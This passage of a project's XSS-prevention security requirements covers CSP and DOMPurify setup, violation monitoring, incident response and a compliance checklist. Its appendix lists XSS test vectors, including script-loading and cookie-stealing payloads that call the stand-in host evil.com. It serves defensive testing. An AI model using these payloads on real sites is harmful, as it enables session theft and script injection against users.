     // Add 30+ more tests from TS-XSS-001
   });
   ```

---

### Phase 2: CSP Implementation (Priority 2)

**Timeline**: 2 hours

**Steps**:
1. ✅ Install Helmet.js:
   ```bash
   npm install helmet
   npm install --save-dev @types/helmet
   ```

2. ✅ Configure CSP middleware (see SR-XSS-007)

3. ✅ Implement nonce generation (see SR-XSS-008)

4. ✅ Set up CSP violation reporting

5. ✅ Test CSP with browser DevTools:
   ```javascript
   // Open DevTools Console
   // Try to execute inline script without nonce
   eval('alert(1)'); // Should be blocked by CSP
   ```

---

### Phase 3: Frontend Sanitization (Priority 3)

**Timeline**: 2 hours

**Steps**:
1. ✅ Install DOMPurify:
   ```bash
   npm install dompurify
   npm install --save-dev @types/dompurify
   ```

2. ✅ Create React sanitization hook:
   ```typescript
   // src/hooks/useSanitize.ts
   import DOMPurify from 'dompurify';
   import { useMemo } from 'react';

   export function useSanitize(html: string, config?: any) {
     return useMemo(() => {
       return DOMPurify.sanitize(html, config);
     }, [html, config]);
   }
   ```

3. ✅ Update components:
   ```typescript
   // src/components/Post.tsx
   import { useSanitize } from '../hooks/useSanitize';

   function Post({ content }: { content: string }) {
     const sanitized = useSanitize(content);
     return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
   }
   ```

4. ✅ Configure ESLint rules (see SR-XSS-003)

---

### Phase 4: Testing & Verification (Priority 4)

**Timeline**: 1 day (8 hours)

**Steps**:
1. ✅ Implement automated XSS test suite (30+ scenarios)
2. ✅ Run OWASP ZAP automated scan
3. ✅ Manual penetration testing
4. ✅ CSP violation monitoring setup
5. ✅ Security code review

---

## Monitoring & Incident Response

### SR-XSS-010: CSP Violation Monitoring

**Requirement**: MUST log and alert on CSP violations.

**Implementation**:
```typescript
// src/routes/csp-report.ts
import { logger } from '../utils/logger';
import { alertSecurityTeam } from '../utils/alerts';

app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), async (req, res) => {
  const violation = req.body['csp-report'];

  // Log to CloudWatch/Sentry
  logger.warn('CSP Violation Detected', {
    documentUri: violation['document-uri'],
    violatedDirective: violation['violated-directive'],
    blockedUri: violation['blocked-uri'],
    sourceFile: violation['source-file'],
    lineNumber: violation['line-number'],
    userAgent: req.headers['user-agent']
  });

  // Alert if high-severity violation
  if (violation['violated-directive']?.startsWith('script-src')) {
    await alertSecurityTeam({
      severity: 'HIGH',
      type: 'CSP_SCRIPT_VIOLATION',
      details: violation
    });
  }

  res.status(204).end();
});
```

**Acceptance Criteria**:
- ✅ AC-XSS-049: CSP violations are logged to monitoring system
- ✅ AC-XSS-050: High-severity violations trigger security alerts
- ✅ AC-XSS-051: CSP reports are reviewed weekly

---

### SR-XSS-011: XSS Incident Response Plan

**Playbook**:

1. **Detection**:
   - ✅ Automated security testing in CI/CD
   - ✅ CSP violation monitoring
   - ✅ User reports via security@startit.rs
   - ✅ Bug bounty program (future)

2. **Triage** (within 2 hours):
   - ✅ Classify severity (Critical/High/Medium/Low)
   - ✅ Identify affected endpoints/features
   - ✅ Estimate user impact

3. **Containment** (within 4 hours):
   - ✅ Deploy hotfix with stricter sanitization
   - ✅ Revoke compromised session tokens
   - ✅ Block malicious IPs if applicable

4. **Remediation** (within 24 hours):
   - ✅ Implement comprehensive fix
   - ✅ Add regression test
   - ✅ Deploy to production

5. **Post-Incident Review** (within 1 week):
   - ✅ Root cause analysis
   - ✅ Update security guidelines
   - ✅ Security awareness training

---

## Compliance Checklist

**Pre-Production Security Audit**:

### Backend Security
- [ ] AC-XSS-001: DOMPurify installed and configured
- [ ] AC-XSS-002: Script tags removed from sanitized output
- [ ] AC-XSS-003: JavaScript protocols blocked
- [ ] AC-XSS-004: Event handlers removed
- [ ] AC-XSS-005: 30+ XSS test vectors implemented
- [ ] AC-XSS-006: Content-specific sanitization functions
- [ ] AC-XSS-012: URL validation rejects dangerous protocols
- [ ] AC-XSS-013: Only http/https protocols allowed

### Frontend Security
- [ ] AC-XSS-009: Client-side DOMPurify installed
- [ ] AC-XSS-010: dangerouslySetInnerHTML used only with sanitization
- [ ] AC-XSS-011: ESLint enforces sanitization rules
- [ ] AC-XSS-015: React JSX used for dynamic content
- [ ] AC-XSS-016: Manual HTML rendering minimized
- [ ] AC-XSS-018: No user input in script tags
- [ ] AC-XSS-019: No user input in style tags

### CSP & Headers
- [ ] AC-XSS-021: CSP header present in all responses
- [ ] AC-XSS-022: script-src uses nonce-based whitelist
- [ ] AC-XSS-023: object-src disabled
- [ ] AC-XSS-024: base-uri restricted
- [ ] AC-XSS-025: CSP violations logged
- [ ] AC-XSS-026: Nonce generated with crypto.randomBytes
- [ ] AC-XSS-027: Nonce unique per request
- [ ] AC-XSS-029: All security headers configured

### Testing
- [ ] AC-XSS-035: 30 XSS test vectors automated
- [ ] AC-XSS-036: BDD scenarios cover all XSS types
- [ ] AC-XSS-037: Tests run in CI/CD pipeline
- [ ] AC-XSS-038: 100% XSS tests passing

### OWASP Compliance
- [ ] AC-XSS-039: No user input in comments/scripts
- [ ] AC-XSS-040: HTML encoding (React JSX)
- [ ] AC-XSS-041: Attribute encoding (React JSX)
- [ ] AC-XSS-042: JavaScript encoding (JSON.stringify)
- [ ] AC-XSS-043: No user input in CSS
- [ ] AC-XSS-044: URL encoding (encodeURIComponent)
- [ ] AC-XSS-045: HTML sanitization (DOMPurify)
- [ ] AC-XSS-046: DOM-based XSS prevented
- [ ] AC-XSS-047: HTTPOnly/Secure cookies
- [ ] AC-XSS-048: CSP implemented

### Monitoring
- [ ] AC-XSS-049: CSP violations logged
- [ ] AC-XSS-050: High-severity alerts configured
- [ ] AC-XSS-051: Weekly CSP report review

**Sign-Off**:
- [ ] Security Engineer: ___________________
- [ ] Tech Lead: ___________________
- [ ] QA Lead: ___________________
- [ ] Date: ___________________

---

## References

1. **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. **OWASP XSS Filter Evasion Cheat Sheet**: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
3. **DOMPurify Documentation**: https://github.com/cure53/DOMPurify
4. **Content Security Policy (CSP)**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
5. **React Security Best Practices**: https://react.dev/learn/editor-setup#security
6. **PortSwigger XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
7. **CWE-79: Cross-site Scripting**: https://cwe.mitre.org/data/definitions/79.html
8. **OWASP Top 10 2021 - A03 Injection**: https://owasp.org/Top10/A03_2021-Injection/

---

## Appendix A: Complete Test Vector Library

**File**: `tests/security/xss-vectors.json`

```json
{
  "scriptInjection": [
    "<script>alert(\"XSS\")</script>",
    "<SCRIPT>alert(\"XSS\")</SCRIPT>",
    "<script src=\"https://evil.com/xss.js\"></script>",
    "<script>fetch(\"https://evil.com?cookie=\"+document.cookie)</script>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<script\\x20type=\"text/javascript\">alert(\"XSS\")</script>",
    "<scr<script>ipt>alert(\"XSS\")</scr</script>ipt>",
    "`<script>alert(\"XSS\")</script>`"
  ],
  "eventHandlers": [
    "<img src=x onerror=\"alert('XSS')\">",
    "<body onload=\"alert('XSS')\">",
    "<div onmouseover=\"alert('XSS')\">Hover me</div>",
    "<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>",
    "<svg onload=\"alert('XSS')\"></svg>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\">",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<form action=\"javascript:alert('XSS')\"><button>Submit</button></form>"
  ],
  "encodingBypass": [
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')>",
    "%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
    "<img src=x on\\nerror=\"alert('XSS')\">",
    "<img/src/onerror=alert('XSS')>",
    "javascript&#58;alert('XSS')"
  ],
  "domBased": [
    "#<img src=x onerror=alert(1)>",
    "document.location.hash",
    "eval(window.name)"
  ],
  "svgImage": [
    "<svg><script>alert(\"XSS\")</script></svg>",
    "<svg><animate onbegin=\"alert('XSS')\" attributeName=\"x\"></svg>",
    "data:image/svg+xml,<svg><script>alert(\"XSS\")</script></svg>"
  ]
}
```

---

## Appendix B: CSP Configuration Template

**File**: `config/csp.ts`

```typescript
import crypto from 'crypto';

export function generateNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}

export const CSP_CONFIG = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      (req: any, res: any) => `'nonce-${res.locals.cspNonce}'`,
    ],
    styleSrc: [
      "'self'",
      (req: any, res: any) => `'nonce-${res.locals.cspNonce}'`,
      "https://fonts.googleapis.com",
    ],
    imgSrc: [
      "'self'",
      "data:",
      "https://s3.amazonaws.com",
      "https://*.cloudfront.net",
    ],
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com",
    ],
    connectSrc: [
      "'self'",
      "https://api.startit.rs",
      "wss://api.startit.rs",
    ],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: [],
    reportUri: ["/api/csp-report"],
  },
};
```

---

**Document Status**: ✅ READY FOR IMPLEMENTATION
**Next Steps**:
1. Review with Tech Lead (1 hour)
2. Implement Phase 1-3 (1 day)
3. Implement test suite (1 day)
4. Security audit (3 days)
5. Deploy to staging (1 day)

**Estimated Total Effort**: 6 days (48 hours)
**Critical Path**: MUST complete before Milestone 3 (Posts) implementation
